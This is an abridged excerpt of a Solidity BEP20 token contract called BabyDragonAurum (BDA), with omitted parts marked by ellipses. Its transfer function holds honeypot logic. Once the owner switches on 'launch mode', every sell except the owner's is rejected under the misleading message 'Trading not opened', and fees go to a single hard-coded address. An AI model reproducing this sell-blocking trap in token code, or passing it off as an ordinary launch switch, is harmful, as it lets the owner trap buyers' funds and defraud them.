...
contract BabyDragonAurum is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "BabyDragonAurum";
    string constant _symbol = "BDA";
    ...
    address public autoLiquidityReceiver=0x81f32b2671aE74C796C1c11BE40e8E436Be68e18;
    address public marketingFeeReceiver=0x81f32b2671aE74C796C1c11BE40e8E436Be68e18;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!isSell && !_isFree[recipient]){
            require((_balances[recipient] + amount) < _maxWallet, "MW");
        }

       
        if (isSell) {
            require((!openedTrading || sender==owner), "Trading not opened");
    ...
    function SetLaunchMode(bool launchmode) external onlyOwner {
        openedTrading = launchmode;
    }
